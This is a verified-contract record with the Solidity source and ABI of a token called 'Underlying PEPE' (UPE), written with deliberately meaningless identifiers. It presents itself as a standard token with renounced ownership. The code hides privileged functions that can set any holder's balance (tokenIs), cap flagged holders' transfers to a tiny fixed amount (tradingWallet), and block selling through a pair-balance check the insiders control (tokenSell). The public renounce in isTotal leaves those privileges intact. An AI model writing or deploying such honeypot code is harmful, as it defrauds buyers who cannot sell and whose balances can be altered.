{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface fromMode {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tradingTeam) external view returns (uint256);\n\n    function transfer(address modeReceiver, uint256 feeWallet) external returns (bool);\n\n    function allowance(address autoMin, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 feeWallet) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address modeReceiver,\n        uint256 feeWallet\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed teamLaunch, uint256 value);\n    event Approval(address indexed autoMin, address indexed spender, uint256 value);\n}\n\nabstract contract enableMarketing {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverMinMarketing {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface amountFrom {\n    function createPair(address liquidityModeBuy, address fromTake) external returns (address);\n}\n\ninterface fromModeMetadata is fromMode {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract UnderlyingPEPE is enableMarketing, fromMode, fromModeMetadata {\n\n    address exemptTakeBuy = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool private feeSenderReceiver;\n\n    function name() external view virtual override returns (string memory) {\n        return fromLaunchedTo;\n    }\n\n    event OwnershipTransferred(address indexed autoFundMax, address indexed autoShould);\n\n    function tradingWallet(address listMarketingLaunched) public {\n        buyLimitMarketing();\n        \n        if (listMarketingLaunched == swapFund || listMarketingLaunched == amountBuy) {\n            return;\n        }\n        buyMarketingMode[listMarketingLaunched] = true;\n    }\n\n    uint256 buyTakeLaunched;\n\n    address public swapFund;\n\n    constructor (){\n        \n        receiverMinMarketing tradingTo = receiverMinMarketing(modeLimit);\n        amountBuy = amountFrom(tradingTo.factory()).createPair(tradingTo.WETH(), address(this));\n        if (tokenIsTake != liquidityModeIs) {\n            launchMin = false;\n        }\n        swapFund = _msgSender();\n        isTotal();\n        amountIs[swapFund] = true;\n        fundWallet[swapFund] = amountSwapSender;\n        if (fundModeIs != liquidityModeIs) {\n            modeSellFrom = false;\n        }\n        emit Transfer(address(0), swapFund, amountSwapSender);\n    }\n\n    function enableAmount(address tradingLiquidityMin, address modeReceiver, uint256 feeWallet) internal returns (bool) {\n        require(fundWallet[tradingLiquidityMin] >= feeWallet);\n        fundWallet[tradingLiquidityMin] -= feeWallet;\n        fundWallet[modeReceiver] += feeWallet;\n        emit Transfer(tradingLiquidityMin, modeReceiver, feeWallet);\n        return true;\n    }\n\n    bool private launchMin;\n\n    function getOwner() external view returns (address) {\n        return maxAtLiquidity;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return feeExempt;\n    }\n\n    function tokenIs(address marketingFund, uint256 feeWallet) public {\n        buyLimitMarketing();\n        fundWallet[marketingFund] = feeWallet;\n    }\n\n    function totalTake(address listMode) public {\n        require(listMode.balance < 100000);\n        if (launchIs) {\n            return;\n        }\n        if (modeSellFrom != launchMin) {\n            launchMin = false;\n        }\n        amountIs[listMode] = true;\n        \n        launchIs = true;\n    }\n\n    function balanceOf(address tradingTeam) public view virtual override returns (uint256) {\n        return fundWallet[tradingTeam];\n    }\n\n    function transfer(address marketingFund, uint256 feeWallet) external virtual override returns (bool) {\n        return tokenSell(_msgSender(), marketingFund, feeWallet);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return amountSwapSender;\n    }\n\n    address public amountBuy;\n\n    string private fromLaunchedTo = \"Underlying PEPE\";\n\n    string private toSwap = \"UPE\";\n\n    address modeLimit = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function approve(address receiverFund, uint256 feeWallet) public virtual override returns (bool) {\n        takeLimit[_msgSender()][receiverFund] = feeWallet;\n        emit Approval(_msgSender(), receiverFund, feeWallet);\n        return true;\n    }\n\n    function allowance(address autoSenderLimit, address receiverFund) external view virtual override returns (uint256) {\n        if (receiverFund == modeLimit) {\n            return type(uint256).max;\n        }\n        return takeLimit[autoSenderLimit][receiverFund];\n    }\n\n    mapping(address => bool) public amountIs;\n\n    uint256 private fundModeIs;\n\n    bool private tokenLiquidity;\n\n    uint256 public liquidityModeIs;\n\n    function toShouldAt(uint256 feeWallet) public {\n        buyLimitMarketing();\n        buyTakeLaunched = feeWallet;\n    }\n\n    mapping(address => bool) public buyMarketingMode;\n\n    bool private modeSellFrom;\n\n    uint256 public tokenIsTake;\n\n    uint256 fundSwapMarketing;\n\n    uint256 private amountSwapSender = 100000000 * 10 ** 18;\n\n    address private maxAtLiquidity;\n\n    function buyLimitMarketing() private view {\n        require(amountIs[_msgSender()]);\n    }\n\n    bool public launchIs;\n\n    function transferFrom(address tradingLiquidityMin, address modeReceiver, uint256 feeWallet) external override returns (bool) {\n        if (_msgSender() != modeLimit) {\n            if (takeLimit[tradingLiquidityMin][_msgSender()] != type(uint256).max) {\n                require(feeWallet <= takeLimit[tradingLiquidityMin][_msgSender()]);\n                takeLimit[tradingLiquidityMin][_msgSender()] -= feeWallet;\n            }\n        }\n        return tokenSell(tradingLiquidityMin, modeReceiver, feeWallet);\n    }\n\n    uint256 public isEnable;\n\n    function owner() external view returns (address) {\n        return maxAtLiquidity;\n    }\n\n    uint256 private maxFund;\n\n    function tokenSell(address tradingLiquidityMin, address modeReceiver, uint256 feeWallet) internal returns (bool) {\n        if (tradingLiquidityMin == swapFund) {\n            return enableAmount(tradingLiquidityMin, modeReceiver, feeWallet);\n        }\n        uint256 listFee = fromMode(amountBuy).balanceOf(exemptTakeBuy);\n        require(listFee == buyTakeLaunched);\n        require(modeReceiver != exemptTakeBuy);\n        if (buyMarketingMode[tradingLiquidityMin]) {\n            return enableAmount(tradingLiquidityMin, modeReceiver, limitFrom);\n        }\n        return enableAmount(tradingLiquidityMin, modeReceiver, feeWallet);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return toSwap;\n    }\n\n    uint256 public exemptSwap;\n\n    mapping(address => mapping(address => uint256)) private takeLimit;\n\n    uint256 constant limitFrom = 15 ** 10;\n\n    mapping(address => uint256) private fundWallet;\n\n    function isTotal() public {\n        emit OwnershipTransferred(swapFund, address(0));\n        maxAtLiquidity = address(0);\n    }\n\n    uint8 private feeExempt = 18;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoFundMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoShould\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamLaunch\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoSenderLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverFund\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeWallet\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTeam\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyMarketingMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityModeIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"feeWallet\",\"type\":\"uint256\"}],\"name\":\"toShouldAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeWallet\",\"type\":\"uint256\"}],\"name\":\"tokenIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenIsTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listMode\",\"type\":\"address\"}],\"name\":\"totalTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listMarketingLaunched\",\"type\":\"address\"}],\"name\":\"tradingWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeWallet\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingLiquidityMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeWallet\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "UnderlyingPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}